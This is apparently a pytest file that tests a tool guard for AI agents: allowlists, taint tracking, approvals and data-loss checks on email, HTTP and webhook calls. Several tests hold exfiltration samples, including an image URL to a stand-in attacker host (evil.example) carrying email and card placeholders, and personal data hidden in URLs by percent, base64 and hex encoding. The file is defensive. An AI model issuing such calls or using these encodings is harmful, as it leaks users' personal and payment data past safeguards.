"""Tool guard: allowlists, placeholder resolution, decoded-URL DLP, taint, approvals."""

from __future__ import annotations

import base64
import secrets

import pytest

from aegis.dlp.engine import DLPEngine
from aegis.guard.interceptor import RunState, ToolGuard, Verdict
from aegis.llm.base import ToolCall
from aegis.policy.schema import Policy
from aegis.types import EntityType
from aegis.vault.backends import MemoryBackend
from aegis.vault.crypto import VaultCipher
from aegis.vault.vault import TokenVault, VaultContext

CTX = VaultContext("acme", "u-1001", "sess-guard-0001", "agent")


@pytest.fixture
def setup(dlp_engine: DLPEngine) -> tuple[ToolGuard, TokenVault]:
    vault = TokenVault(MemoryBackend(), VaultCipher({"k": secrets.token_bytes(32)}, "k"))
    vault.open_session("acme", "u-1001", CTX.session_id)
    return ToolGuard(vault, dlp_engine), vault


def check(guard: ToolGuard, policy: Policy, name: str, tainted: bool = False, **args: str):  # type: ignore[no-untyped-def]
    return guard.check(
        ToolCall(name, dict(args)), CTX, RunState(tainted=tainted, taint_sources=["kb-204"]), policy
    )


def rules(result) -> set[str]:  # type: ignore[no-untyped-def]
    return {r["rule"] for r in result.reasons}


def test_personal_gmail_via_placeholder_is_blocked(setup, default_policy: Policy) -> None:  # type: ignore[no-untyped-def]
    guard, vault = setup
    ph = vault.tokenize(
        "avery-quill-personal@gmail.com", "avery-quill-personal@gmail.com", EntityType.EMAIL, CTX
    )
    r = check(guard, default_policy, "send_email", to=ph, subject="s", body="summary")
    assert r.verdict is Verdict.BLOCK and "R-TOOL-PERSONAL-DOMAIN" in rules(r)
    assert r.facts["recipient_domains"] == ["gmail.com"]


def test_unknown_external_domain_is_blocked(setup, default_policy: Policy) -> None:  # type: ignore[no-untyped-def]
    guard, _ = setup
    r = check(guard, default_policy, "send_email", to="ops@partner.example", subject="s", body="b")
    assert r.verdict is Verdict.BLOCK and rules(r) == {"R-TOOL-DOMAIN-NOT-ALLOWLISTED"}


def test_corporate_recipient_needs_approval(setup, default_policy: Policy) -> None:  # type: ignore[no-untyped-def]
    guard, _ = setup
    r = check(
        guard,
        default_policy,
        "send_email",
        to="avery.quill@acme.example",
        subject="s",
        body="[PERSON_NAME_1]",
    )
    assert r.verdict is Verdict.REQUIRE_APPROVAL and rules(r) == {"R-TOOL-HIGH-RISK"}


def test_one_bad_recipient_in_a_list_blocks(setup, default_policy: Policy) -> None:  # type: ignore[no-untyped-def]
    guard, _ = setup
    r = check(
        guard, default_policy, "send_email", to="a@acme.example, not..real@outlook.com", subject="s", body="b"
    )
    assert r.verdict is Verdict.BLOCK and "R-TOOL-PERSONAL-DOMAIN" in rules(r)


def test_unresolvable_placeholder_recipient_blocks(setup, default_policy: Policy) -> None:  # type: ignore[no-untyped-def]
    guard, _ = setup
    r = check(guard, default_policy, "send_email", to="[EMAIL_9]", subject="s", body="b")
    assert r.verdict is Verdict.BLOCK and "R-TOOL-RECIPIENT-UNRESOLVED" in rules(r)


def test_exfil_image_url_is_blocked_three_ways(setup, default_policy: Policy) -> None:  # type: ignore[no-untyped-def]
    guard, _ = setup
    r = check(
        guard,
        default_policy,
        "render_image",
        tainted=True,
        url="https://img-cdn.evil.example/p.png?d=[EMAIL_1]|[CREDIT_CARD_1]",
    )
    assert r.verdict is Verdict.BLOCK
    assert {"R-TOOL-URL-NOT-ALLOWLISTED", "R-TOOL-DATA-IN-URL", "R-TOOL-TAINTED-SESSION"} <= rules(r)


@pytest.mark.parametrize(
    "url",
    [
        "https://docs.acme.example/track?email=dana.holloway%40example.com",  # percent-encoded raw email
        "https://docs.acme.example/track?q="
        + base64.urlsafe_b64encode(b"dana.holloway@example.com").decode(),
        "https://docs.acme.example/t/" + b"4111111111111111".hex(),  # hex-encoded card
        "https://docs.acme.example/t?d=%5BEMAIL_1%5D",  # percent-encoded placeholder
    ],
)
def test_data_smuggled_into_allowlisted_urls_is_blocked(setup, default_policy: Policy, url: str) -> None:  # type: ignore[no-untyped-def]
    guard, _ = setup
    r = check(guard, default_policy, "http_get", url=url)
    assert r.verdict is Verdict.BLOCK and "R-TOOL-DATA-IN-URL" in rules(r), r.public()


def test_clean_allowlisted_url_is_allowed(setup, default_policy: Policy) -> None:  # type: ignore[no-untyped-def]
    guard, _ = setup
    r = check(guard, default_policy, "http_get", url="https://docs.acme.example/shipping")
    assert r.verdict is Verdict.ALLOW and r.reasons == []


def test_taint_blocks_even_allowlisted_medium_risk_tools(setup, default_policy: Policy) -> None:  # type: ignore[no-untyped-def]
    guard, _ = setup
    r = check(guard, default_policy, "http_get", tainted=True, url="https://docs.acme.example/shipping")
    assert r.verdict is Verdict.BLOCK and rules(r) == {"R-TOOL-TAINTED-SESSION"}


def test_taint_does_not_block_low_risk_reads(setup, default_policy: Policy) -> None:  # type: ignore[no-untyped-def]
    guard, _ = setup
    assert check(guard, default_policy, "read_wiki", tainted=True, page_id="kb-101").verdict is Verdict.ALLOW


def test_webhook_payload_with_placeholders_is_blocked(setup, default_policy: Policy) -> None:  # type: ignore[no-untyped-def]
    guard, _ = setup
    r = check(
        guard,
        default_policy,
        "post_webhook",
        url="https://api.acme.example/hook",
        payload='{"e":"[EMAIL_1]"}',
    )
    assert r.verdict is Verdict.BLOCK and "R-TOOL-DATA-IN-PAYLOAD" in rules(r)


def test_raw_card_in_email_body_is_blocked(setup, default_policy: Policy) -> None:  # type: ignore[no-untyped-def]
    guard, _ = setup
    r = check(
        guard, default_policy, "send_email", to="a@acme.example", subject="s", body="card 4111 1111 1111 1111"
    )
    assert r.verdict is Verdict.BLOCK and "R-TOOL-RAW-SENSITIVE" in rules(r)


def test_unknown_tool_and_bad_args(setup, default_policy: Policy) -> None:  # type: ignore[no-untyped-def]
    guard, _ = setup
    assert rules(check(guard, default_policy, "delete_database")) == {"R-TOOL-UNKNOWN"}
    assert "R-TOOL-ARGS" in rules(check(guard, default_policy, "send_email", to="a@acme.example"))
    assert "R-TOOL-ARGS" in rules(
        check(guard, default_policy, "http_get", url="https://docs.acme.example", x="1")
    )
